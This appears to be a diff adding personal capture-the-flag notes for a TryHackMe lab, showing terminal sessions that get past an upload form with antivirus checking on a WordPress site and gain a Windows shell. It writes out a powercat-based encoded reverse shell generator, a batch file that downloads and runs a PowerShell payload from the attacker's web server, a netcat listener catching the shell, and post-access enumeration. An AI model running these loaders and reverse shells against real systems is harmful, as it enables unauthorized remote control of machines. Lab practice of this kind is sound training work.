@@ -277,6 +277,98 @@ POST http://avenger.tryhackme/gift/
 POST http://avenger.tryhackme/gift/wp-comments-post.php
 
 
-### http://avenger.tryhackme/gift/wp-content/uploads/
+### http://avenger.tryhackme/gift
+
+## There is upload form with AV checkin - need bypass upload form
+
+┌──(duke㉿kali)-[/Documents/THM_AVenger]
+└─$ LHOST=10.9.30.202
+                                                                                                                                                                                                                                            
+┌──(duke㉿kali)-[/Documents/THM_AVenger]
+└─$ LPORT=49731      
+                                                                                                                                                                                                                                            
+┌──(duke㉿kali)-[/Documents/THM_AVenger]
+└─$ rshell=rs-49731.txt
+                                                                                                                                                                                                                                            
+┌──(duke㉿kali)-[/Documents/THM_AVenger]
+└─$ pwsh -c "iex (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c $LHOST -p $LPORT -e cmd.exe -ge" > ./$rshell                                   
+                                                                                                                                                                                                                                            
+┌──(duke㉿kali)-[/Documents/THM_AVenger]
+└─$ ls
+calculator.bat  ntlm_theft  powercat.ps1  req.txt  rev_shell.nim  rs-49731.txt  Screenshot_2024-06-26_06_58_31.png  test.bat  test.xt  t.go
+                                                                                                                                                                                                                                            
+┌──(duke㉿kali)-[/Documents/THM_AVenger]
+└─$ cat rs-49731.txt 
+ZgB1AG4AYwB0AGkAbwBuACAAUwB0AHIAZQBhAG0AMQBfAFMAZQB0AHUAcAAKAHsACgAKACAAIAAgACAAcABhAHIAYQBtACgAJABGAHUAbgBjAFMAZQB0AHUAcABWAGEAcgBzACkACgAgACAAIAAgACQAYwAsACQAbAAsACQAcAAsACQAdAAgAD0AIAAkAEYAdQBuAGMAUwBlAHQAdQBwAFYAYQByAHMACgAgACAAIAAgAGkAZgAo..                                                                                                                                                                                                                                            
+
+┌──(duke㉿kali)-[/Documents/THM_AVenger]
+└─$ cat getexp.bat  
+START /B powershell -c $code=(New-Object System.Net.Webclient).DownloadString('http://10.9.30.202:9000/shell-49731.txt');iex 'powershell -E $code'
+                                                                                                                                                                                                                                            
+### run web server on port 9000 for download RS and Upload getexp.bat run RS listener on port 49731
+
+## Get initial Access
+
+┌──(duke㉿kali)-[~]
+└─$ nc -lvnp 49731
+listening on [any] 49731 ...
+connect to [10.9.30.202] from (UNKNOWN) [10.10.156.71] 49871
+Microsoft Windows [Version 10.0.17763.4499]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is A8A4-C362
+
+ Directory of C:\
+
+07/25/2023  02:58 PM               533 .htaccess
+06/29/2023  11:09 AM    <DIR>          0cdbb62efcb829a78821aac0e9
+11/14/2018  06:56 AM    <DIR>          EFI
+05/13/2020  05:58 PM    <DIR>          PerfLogs
+11/26/2023  02:56 PM    <DIR>          Program Files
+06/27/2023  08:51 AM    <DIR>          Program Files (x86)
+06/30/2023  07:52 AM    <DIR>          Users
+07/10/2023  07:24 AM    <DIR>          Windows
+07/04/2023  10:12 AM    <DIR>          xampp
+               1 File(s)            533 bytes
+               8 Dir(s)  10,905,255,936 bytes free
+
+C:\Users>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is A8A4-C362
+
+ Directory of C:\Users
+
+06/30/2023  07:52 AM    <DIR>          .
+06/30/2023  07:52 AM    <DIR>          ..
+09/18/2024  07:45 AM    <DIR>          Administrator
+11/25/2023  12:15 AM    <DIR>          hugo
+12/12/2018  07:45 AM    <DIR>          Public
+               0 File(s)              0 bytes
+               5 Dir(s)  10,904,109,056 bytes free
+
+C:\Users\hugo\Desktop>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is A8A4-C362
+
+ Directory of C:\Users\hugo\Desktop
+
+07/10/2023  09:40 PM    <DIR>          .
+07/10/2023  09:40 PM    <DIR>          ..
+06/21/2016  03:36 PM               527 EC2 Feedback.website
+06/21/2016  03:36 PM               554 EC2 Microsoft Windows Guide.website
+07/25/2023  02:14 PM                48 user.txt
+               3 File(s)          1,129 bytes
+               2 Dir(s)  10,904,109,056 bytes free
+
+C:\Users\hugo\Desktop>type user.txt
+type user.txt
+THM{WITH_GREAT_POWER_COMES_GREAT_RESPONSIBILITY}
+C:\Users\hugo\Desktop>net user
+net user
 
 
